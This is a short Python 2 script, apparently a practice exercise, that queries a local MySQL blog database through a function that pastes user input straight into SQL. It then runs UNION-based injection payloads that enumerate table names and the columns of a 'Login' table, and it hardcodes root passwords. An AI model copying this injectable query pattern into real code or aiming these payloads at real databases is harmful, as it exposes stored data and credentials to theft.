import MySQLdb

def connection():
    #connections
    db = MySQLdb.connect(host="localhost",    # your host, usually localhost
                         user="root",         # your username
                         passwd="pwd",  # your password
                         db="user_fun")        # name of the data base
    cur = db.cursor()
    # Use all the SQL you like
    cur.execute("SELECT DATABASE();")

    # print all the first cell of all the rows
    for row in cur.fetchall():
        print row[0]

    db.close()

#logins for the user
def search(user):
    #connections
    db = MySQLdb.connect(host="localhost",    # your host, usually localhost
                         user="root",         # your username
                         passwd="Airjordan23",  # your password
                         db="user_fun")

    cur = db.cursor()
    query = """
    SELECT post_ID,user,title,post
    FROM Blog
    WHERE user = "%s"
    """ % (user)

    print query

    cur.execute(query)

    #displaying the information
    my_string = ""
    print "ID   user   title    post"
    for row in cur.fetchall():
        for item in row:
            print item,
        print

#gets all of the table names in the database
search("m \" UNION (SELECT table_name,1,1,1 FROM information_schema.tables ORDER BY table_name);--"
)

#why won't the midline comment work?
#gets all the columns of the table asked for.
search("m \" UNION (SELECT column_name,1,1,1 FROM information_schema.columns WHERE table_name = 'Login');--"
)

#gets all the columns of the table asked for.
search("m \" UNION (SELECT column_name,1,1,1 FROM information_schema.columns WHERE table_name = 'Login');--"
)
